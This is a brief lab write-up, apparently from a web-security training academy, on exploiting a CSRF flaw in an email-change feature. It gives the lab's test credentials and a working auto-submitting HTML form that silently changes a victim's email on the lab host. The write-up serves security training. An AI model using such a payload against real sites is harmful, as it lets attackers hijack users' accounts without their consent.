# Lab: CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter

## CSRF
* 題目說要構造一組 CSRF payload 導致 victim 訪問過後會把 email 改成自己指定的 email
```html
<form method="post" action="https://acbb1f171f9f07e9c0371cd600e30013.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="exploit@email.com">
</form>
<script>
        document.forms[0].submit();
</script>
```